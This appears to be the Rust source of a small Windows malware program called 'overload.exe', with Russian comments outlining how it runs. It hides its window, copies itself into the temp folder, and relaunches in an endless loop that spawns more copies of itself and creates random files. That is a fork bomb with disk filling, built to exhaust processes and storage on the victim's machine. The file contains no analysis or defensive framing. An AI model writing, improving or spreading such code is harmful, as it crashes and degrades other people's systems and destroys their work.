#![windows_subsystem = "windows"]

mod utils;

use std::{env, process::Command};
use utils::{join_paths, random_file, self_copy};

/// Старый алгоритм
/// => первый запуск и самокопирование: overload.exe -cr второй аргумент(путь файла)
/// => удаление старого файла: overload.exe -c
/// => повторение overload.exe -c.
/// Новый алгоритм
/// => первый запуск и самокопирование: overload.exe(путь файла)
/// => повторенный запуск из новой директории overload.exe -c.
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        let dir = join_paths(&env::var("temp").expect(""), "overload.exe");
        self_copy(&dir);

        Command::new(dir).arg("-c").spawn().expect("");
    } else if *args.get(1).unwrap() == "-c" {
        loop {
            Command::new("overload.exe").arg("-c").spawn().expect("");
            random_file();
        }
    }
}
